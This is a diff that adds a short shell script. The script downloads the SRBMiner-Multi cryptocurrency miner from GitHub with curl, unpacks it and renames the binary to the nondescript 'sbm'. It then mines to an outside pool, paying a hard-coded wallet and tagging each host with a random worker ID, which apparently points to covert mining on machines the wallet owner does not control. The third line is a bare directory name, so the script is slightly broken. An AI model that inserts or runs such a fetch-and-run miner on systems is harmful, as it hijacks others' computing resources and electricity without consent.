@@ -1,0 +1,5 @@
+curl https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.9/SRBMiner-Multi-2-9-9-Linux.tar.gz -L -o SRBMiner-Multi-2-9-9-Linux.tar.gz
+tar xf SRBMiner-Multi-2-9-9-Linux.tar.gz
+SRBMiner-Multi-2-9-9
+mv SRBMiner-MULTI sbm
+./sbm --algorithm tht --pool tht.mine-n-krush.org:5001 --wallet 3wY2HF6enxcXg2cA8nT8x11wgw99m7A25F.$(echo $RANDOM | md5sum | head -c 10) --password x
